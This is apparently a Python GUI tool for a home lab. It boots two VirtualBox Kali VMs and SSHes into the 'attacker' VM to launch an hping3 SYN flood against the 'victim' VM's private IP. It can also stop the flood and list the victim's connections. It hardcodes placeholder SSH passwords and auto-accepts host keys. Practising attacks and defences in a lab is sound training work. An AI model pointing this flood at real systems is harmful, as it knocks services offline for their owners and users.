import subprocess
import time
import threading
import paramiko
import tkinter as tk
from tkinter import scrolledtext

# VM names in VirtualBox
vm_attacker = "Kali-Linux-Attacker"
vm_victim = "Kali-Linux-Victim"

# Victim VM IP (replace with actual IP)
victim_ip = "192.168.1.102"

# Attacker VM SSH details
attacker_ip = "192.168.1.101"
attacker_user = "kali"
attacker_pass = "yourpassword"

# Victim VM SSH details
victim_user = "kali"
victim_pass = "yourpassword"

# Function to log messages in the UI
def log_message(msg):
    log_text.insert(tk.END, msg + "\n")
    log_text.see(tk.END)

# Start VMs
def start_vms():
    log_message("Starting VMs...")
    subprocess.run(["VBoxManage", "startvm", vm_attacker, "--type", "headless"])
    subprocess.run(["VBoxManage", "startvm", vm_victim, "--type", "headless"])
    log_message("VMs started. Waiting for boot...")
    time.sleep(30)  # Adjust for boot time
    log_message("VMs are ready.")

# Start DDoS Attack
def start_attack():
    log_message("Connecting to attacker VM...")
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(attacker_ip, username=attacker_user, password=attacker_pass)
        
        attack_command = f"sudo hping3 -S --flood -p 80 {victim_ip}"
        log_message("Launching attack...")
        
        ssh.exec_command(attack_command)
        log_message(f"Attacking {victim_ip} from {attacker_ip}...")
        ssh.close()
    except Exception as e:
        log_message(f"Error: {e}")

# Stop Attack
def stop_attack():
    log_message("Stopping attack...")
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(attacker_ip, username=attacker_user, password=attacker_pass)
        
        ssh.exec_command("pkill hping3")
        log_message("Attack stopped.")
        ssh.close()
    except Exception as e:
        log_message(f"Error: {e}")

# Monitor Victim VM
def monitor_victim():
    log_message("Connecting to victim VM to monitor network...")

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(victim_ip, username=victim_user, password=victim_pass)
        
        stdin, stdout, stderr = ssh.exec_command("netstat -antp | grep ESTABLISHED")
        
        log_message("Victim's active connections:\n" + stdout.read().decode())
        ssh.close()
    except Exception as e:
        log_message(f"Error: {e}")

# Create GUI
root = tk.Tk()
root.title("VM DDoS Simulator")

frame = tk.Frame(root)
frame.pack(pady=20)

# Buttons
btn_start_vms = tk.Button(frame, text="Start VMs", command=lambda: threading.Thread(target=start_vms).start())
btn_start_attack = tk.Button(frame, text="Start Attack", command=lambda: threading.Thread(target=start_attack).start())
btn_stop_attack = tk.Button(frame, text="Stop Attack", command=lambda: threading.Thread(target=stop_attack).start())
btn_monitor = tk.Button(frame, text="Monitor Victim", command=lambda: threading.Thread(target=monitor_victim).start())

btn_start_vms.grid(row=0, column=0, padx=5)
btn_start_attack.grid(row=0, column=1, padx=5)
btn_stop_attack.grid(row=0, column=2, padx=5)
btn_monitor.grid(row=0, column=3, padx=5)

# Log Output
log_text = scrolledtext.ScrolledText(root, width=60, height=20)
log_text.pack(pady=10)

root.mainloop()
